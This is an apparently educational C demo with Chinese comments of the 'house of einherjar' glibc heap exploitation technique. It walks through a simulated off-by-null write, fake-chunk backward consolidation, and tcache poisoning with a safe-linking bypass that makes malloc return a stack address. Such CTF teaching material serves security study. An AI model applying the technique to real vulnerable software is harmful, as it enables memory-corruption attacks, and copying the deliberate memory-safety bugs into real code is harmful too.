/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_einherjar
 * 文件标注范围：2.43
 * 模拟漏洞：用一次 off-by-null/off-by-one 清掉 PREV_INUSE，同时能伪造 prev_size 和前块的双向链。
 * 核心流程：让 free 误以为前面存在一个 fake free chunk，借后向合并拼出一个覆盖到活动 chunk 的大块，
 *          再靠 tcache poisoning 定位到最终目标。
 * 成功判据：重新分配后拿到重叠区域或目标地址。2.29 起要求 prev_size 与前块 size 相等，2.32 起 poisoning 需要安全链接编码。
 *
 * 阅读约定：malloc 返回的是用户数据区；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。文件里出现的 UAF、越界和 double free 都是故意模拟的漏洞行为，不是正常的 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时要按实际 libc 源码重新判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

int main()
{
	/*
	 * 这是 Huascar Tejeda（@htejeda）为已启用 tcache 的版本改造的 Einherjar。
	 * off-by-null 清掉下一块的 PREV_INUSE，再用伪造的 prev_size 让它向后合并到堆内的
	 * fake chunk，中间要用到堆泄漏来算出距离。先把对应 tcache 填满，确保这次关键的 free
	 * 能越过 tcache，真正走到会执行 backward consolidation 的 unsorted 路径。
	 *
	 * fake chunk 放在当前 arena 已经向系统申请到的堆范围内，这样能避开普通 bin 对
	 * chunk size 不能超过 system_mem 的限制；相关的加固提交见：
	 * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c
	 */

	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	// 准备一个栈上目标。glibc 2.32 的 safe-linking 提交同时新增了链节点对齐检查，
	// 因此 target 必须满足 0x10 的 malloc 对齐；相关提交见：
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41
	intptr_t stack_var[0x10];
	intptr_t *target = NULL;

	// 在数组里找一个最低 4 位为零的地址，保证 poisoned next 能被 malloc 接受。
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);

	intptr_t *a = malloc(0x38);

	// 在 a 的用户区开头伪造一个 free chunk；因为它位于真实堆上，能满足 system_mem 的范围检查。

	a[0] = 0;	// fake chunk 自身的 prev_size 在这条向后合并路径里不会被用到。
	a[1] = 0x60; // 先给一个合法的初始 size，后面会覆盖成 fake chunk 到 c header 的真实距离。
	a[2] = (size_t) a; // fd 指向自己，满足 unlink 里 FD->bk == P 的检查。
	a[3] = (size_t) a; // bk 指向自己，满足 unlink 里 BK->fd == P 的检查。

	uint8_t *b = (uint8_t *) malloc(0x28);

	int real_b_size = malloc_usable_size(b);

	/*
	 * 选择请求 0xf8，让对齐后的物理 size 为 0x100，带 PREV_INUSE 时为 0x101。
	 * 最低有效尺寸字节本来就是 0x00，off-by-null 只会清掉标志位，不会意外
	 * 把 chunk 缩小；如果低字节还含有尺寸信息，就必须在缩小后的边界另行伪造 next chunk。
	 */
	uint8_t *c = (uint8_t *) malloc(0xf8);

	// off-by-null 覆盖 c->size 的最低字节，清掉 PREV_INUSE 但仍保持有效尺寸 0x100。

	// 漏洞模拟开始：向 b 用户区末端之后多写一个空字节。
	b[real_b_size] = 0;
	// 漏洞模拟结束：c 的 PREV_INUSE 已被清掉。

	// 用 b 末尾伪造 c->prev_size，让 backward consolidation 从 c 精确回退到 a。

	size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);

	*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;

	// 把 a->size 同步成 c->prev_size，满足 size(P)==prev_size(next_chunk(P)) 这条检查。
	a[1] = fake_size;

	// 释放 c 之前先填满对应的 0x100 tcache，让 c 越过 tcache，真正执行 backward consolidation。
	intptr_t *x[0x10];
	for(int i=0; i<0x10; i++) {
		x[i] = malloc(0xf8);
	}

	for(int i=0; i<0x10; i++) {
		free(x[i]);
	}

	free(c);

	intptr_t *d = malloc(0x158);

	// 合并完成后从这个大 free 区重新切块，借重叠写继续做 tcache poisoning。
	uint8_t *pad = malloc(0x28);
	free(pad);

	free(b);

	// safe-linking 编码需要知道保存 next 的 storage 地址；Einherjar 本身已经要求
	// 一次堆泄漏来计算 fake prev_size，这里直接复用同一次泄漏，不引入新的原语。
	d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12);

	// 先取走正常链头的那次分配，再申请一次拿到被伪造进 tcache 的 target。
	malloc(0x28);
	intptr_t *e = malloc(0x28);

	// 严格断言返回地址就是栈上的 target，排除只完成重叠区域但没完成 poisoning 的情况。
	assert(e == target);
}
